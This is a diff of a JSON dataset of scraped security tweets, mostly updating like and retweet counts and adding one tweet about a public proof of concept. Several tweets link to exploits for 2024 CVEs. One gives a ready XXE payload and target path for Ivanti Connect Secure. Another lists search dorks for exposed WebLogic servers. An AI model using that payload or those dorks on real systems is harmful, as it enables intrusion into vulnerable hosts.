@@ -28,7 +28,7 @@
     "expanded_url": [
         "https://decoded.avast.io/janvojtesek/lazarus-and-the-fudmodule-rootkit-beyond-byovd-with-an-admin-to-kernel-zero-day/"
     ],
-    "tweetfavorites": 501,
+    "tweetfavorites": 500,
     "tweetquotes": 7,
     "tweetreplies": 7,
     "tweetretweets": 182,
@@ -249,6 +249,19 @@
     "username": "cyber_advising"
 }
 {
+    "expanded_url": [
+        "https://github.com/eternalsakura/my_poc/tree/main/CVE-2024-23214"
+    ],
+    "tweetfavorites": 38,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 3,
+    "tweettext": "@xvonfers My CVE-2024-23214: heap-use-after-free on gl::Texture::releaseTexImageFromSurface poc public:\nhttps://t.co/TL777gLghA\n\nI don't have time to research its exploitability, so if anyone is interested in writing a writeup for it, it would be greatly appreciated.",
+    "tweettime": "2024-02-24, 00:52:40",
+    "tweeturl": "https://twitter.com/eternalsakura13/status/1761192386607350158",
+    "username": "eternalsakura13"
+}
+{
     "tweetfavorites": 0,
     "tweetquotes": 0,
     "tweetreplies": 0,
@@ -396,10 +409,10 @@
         "https://snicco.io/vulnerability-disclosure/bricks/unauthenticated-rce-in-bricks-1-9-6",
         "https://github.com/Chocapikk/CVE-2024-25600"
     ],
-    "tweetfavorites": 816,
+    "tweetfavorites": 809,
     "tweetquotes": 4,
-    "tweetreplies": 9,
-    "tweetretweets": 218,
+    "tweetreplies": 10,
+    "tweetretweets": 215,
     "tweettext": "CVE-2024-25600: Unauth. RCE vulnerability caused by PHP code injection in Bricks Builder, a WordPress site builder with over 25,000+ active installations.\n\nSeverity: Critical (CVSS 9.8)\nRoot cause analysis: https://t.co/E5K0sIZQn9\nPoC: https://t.co/8DflZk7QIW\nMitigation: Upgrade https://t.co/gQWw2Ov81h",
     "tweettime": "2024-02-21, 15:40:32",
     "tweeturl": "https://twitter.com/win3zz/status/1760328659208974363",
@@ -445,7 +458,7 @@
     "tweetfavorites": 0,
     "tweetquotes": 0,
     "tweetreplies": 0,
-    "tweetretweets": 153,
+    "tweetretweets": 154,
     "tweettext": "RT @theflow0: Last year I discovered multiple bugs in virtio-net for VirtualBox (CVE-2023-22098, CVE-2023-22099, CVE-2023-22100) and wrote…",
     "tweettime": "2024-02-20, 19:39:26",
     "tweeturl": "https://twitter.com/fdfalcon/status/1760026393306698034",
@@ -609,7 +622,7 @@
     "username": "momika233"
 }
 {
-    "tweetfavorites": 92,
+    "tweetfavorites": 93,
     "tweetquotes": 1,
     "tweetreplies": 3,
     "tweetretweets": 16,
@@ -680,7 +693,7 @@
     "tweetfavorites": 288,
     "tweetquotes": 0,
     "tweetreplies": 3,
-    "tweetretweets": 92,
+    "tweetretweets": 91,
     "tweettext": "CVE-2024-21413 | Microsoft Outlook Remote Code Execution Vulnerability PoC\nhttps://t.co/Sg9uRdeD4v",
     "tweettime": "2024-02-18, 01:14:27",
     "tweeturl": "https://twitter.com/momika233/status/1759023540014379277",
@@ -690,10 +703,10 @@
     "expanded_url": [
         "https://github.com/Neo23x0/signature-base/blob/master/yara/expl_outlook_cve_2024_21413.yar"
     ],
-    "tweetfavorites": 544,
+    "tweetfavorites": 557,
     "tweetquotes": 2,
     "tweetreplies": 9,
-    "tweetretweets": 173,
+    "tweetretweets": 169,
     "tweettext": "I wrote a YARA rule designed to identify emails attempting to exploit CVE-2024-21413, a vulnerability in Microsoft Outlook that permits the unauthorized acquisition of NTLM credentials\n\n#100daysofYARA #YARA\nhttps://t.co/RhIcyltkKV https://t.co/rSATinTuhk",
     "tweettime": "2024-02-17, 09:57:52",
     "tweeturl": "https://twitter.com/cyb3rops/status/1758792873254744344",
@@ -765,10 +778,10 @@
     "expanded_url": [
         "https://securityonline.info/poc-exploit-released-for-microsoft-outlook-rce-flaw-cve-2024-21413/"
     ],
-    "tweetfavorites": 376,
+    "tweetfavorites": 354,
     "tweetquotes": 1,
     "tweetreplies": 3,
-    "tweetretweets": 129,
+    "tweetretweets": 121,
     "tweettext": "PoC Exploit Released for Microsoft Outlook RCE Flaw – CVE-2024-21413 https://t.co/VRVSMp0vLH",
     "tweettime": "2024-02-16, 11:55:46",
     "tweeturl": "https://twitter.com/Dinosn/status/1758460154503115203",
@@ -792,7 +805,7 @@
         "http://Netlas.io",
         "https://nt.ls/YwRUO"
     ],
-    "tweetfavorites": 50,
+    "tweetfavorites": 52,
     "tweetquotes": 0,
     "tweetreplies": 0,
     "tweetretweets": 20,
@@ -933,10 +946,10 @@
     "expanded_url": [
         "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-21413"
     ],
-    "tweetfavorites": 95,
+    "tweetfavorites": 92,
     "tweetquotes": 1,
     "tweetreplies": 3,
-    "tweetretweets": 43,
+    "tweetretweets": 41,
     "tweettext": "From Patch Tuesday to Exploit Wednesday 😱\n\nMicrosoft is now marking CVE-2024-21413  as exploited 0day (MS Office remote code execution -- CVSS 9.8)\n\nhttps://t.co/qx8jiK5MNK https://t.co/7HmsbuHJwj",
     "tweettime": "2024-02-14, 20:24:59",
     "tweeturl": "https://twitter.com/ryanaraine/status/1757863527677886769",
@@ -1200,10 +1213,10 @@
     "username": "M_haggis"
 }
 {
-    "tweetfavorites": 81,
-    "tweetquotes": 1,
+    "tweetfavorites": 95,
+    "tweetquotes": 2,
     "tweetreplies": 1,
-    "tweetretweets": 32,
+    "tweetretweets": 37,
     "tweettext": "We believe the public PoC for for CVE-2020-3580 XSS affecting Cisco ASA and FTD may be being utilized to curate a list of IP's that are likely to be vulnerable to CVE-2020-3259, an unauthenticated memory disclosure vulnerability, recently attributed to Akira ransomware. https://t.co/QeGRd2lmCj",
     "tweettime": "2024-02-09, 20:31:13",
     "tweeturl": "https://twitter.com/GreyNoiseIO/status/1756053159980712165",
@@ -1319,10 +1332,10 @@
     "username": "piedpiper1616"
 }
 {
-    "tweetfavorites": 570,
-    "tweetquotes": 1,
-    "tweetreplies": 3,
-    "tweetretweets": 134,
+    "tweetfavorites": 609,
+    "tweetquotes": 2,
+    "tweetreplies": 4,
+    "tweetretweets": 143,
     "tweettext": "CVE-2024-22024,  XXE on Ivanti Connect Secure\n\npayload encoded base64:\n\n&lt;?xml version=\"1.0\" ?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % xxe SYSTEM \"http://{{external-host}}/x\"&gt; %xxe;]&gt;&lt;r&gt;&lt;/r&gt;\n\nsend it to  127.0.0.1/dana-na/auth/saml-sso.cgi with SAMLRequest parm\n\n#bugbountytips #cve #Ivanti https://t.co/ShIkDghTU0",
     "tweettime": "2024-02-09, 07:03:25",
     "tweeturl": "https://twitter.com/h4x0r_dz/status/1755849867149103106",
@@ -1468,11 +1481,11 @@
         "http://Hunter.how",
         "https://hunter.how/list?searchValue=product.name%3D%22WebLogic%20Server%22"
     ],
-    "tweetfavorites": 233,
+    "tweetfavorites": 230,
     "tweetquotes": 2,
     "tweetreplies": 1,
-    "tweetretweets": 86,
-    "tweettext": "🚨Alert🚨CVE-2024-20931 Oracle A RCE vuln based on Weblogic T3\\IIOP protocol \nPOC Released\n📊10.9K+ Services are found on the https://t.co/WrjZaG0jRH\n🔗Hunter:https://t.co/Md98R2woCN\nDorks 👇👇👇\nHunter:/product.name=\"WebLogic Server\"\nFOFA: protocol=\"WebLogic\"\nShodan:… https://t.co/Mhv5b17kiP",
+    "tweetretweets": 84,
+    "tweettext": "🚨Alert🚨CVE-2024-20931 Oracle A RCE vuln based on Weblogic T3\\IIOP protocol \nPOC Released\n📊10.9K+ Services are found on the https://t.co/WrjZaG0jRH\n🔗Hunter:https://t.co/Md98R2woCN\nDorks 👇👇👇\nHunter:/product.name=\"WebLogic Server\"\nFOFA: protocol=\"WebLogic\"\nShodan: https://t.co/Mhv5b17kiP",
     "tweettime": "2024-02-06, 07:04:07",
     "tweeturl": "https://twitter.com/HunterMapping/status/1754762881122603290",
     "username": "HunterMapping"
@@ -1520,7 +1533,7 @@
     "expanded_url": [
         "https://github.com/hrtowii/CVE-2024-23208-test"
     ],
-    "tweetfavorites": 128,
+    "tweetfavorites": 127,
     "tweetquotes": 2,
     "tweetreplies": 6,
     "tweetretweets": 23,
@@ -1719,10 +1732,10 @@
     "expanded_url": [
         "https://qriousec.github.io/post/vbox-pwn2own-2023/"
     ],
-    "tweetfavorites": 263,
+    "tweetfavorites": 252,
     "tweetquotes": 1,
     "tweetreplies": 1,
-    "tweetretweets": 83,
+    "tweetretweets": 77,
     "tweettext": "Interesting blog post on exploiting VirtualBox on Windows (CVE-2023-21987 and CVE-2023-21991)\n\nhttps://t.co/E3vPy2raRR\n\n#virtualbox #cybersecurity https://t.co/Mry3edQeqj",
     "tweettime": "2024-02-02, 17:30:21",
     "tweeturl": "https://twitter.com/0xor0ne/status/1753470924634964210",
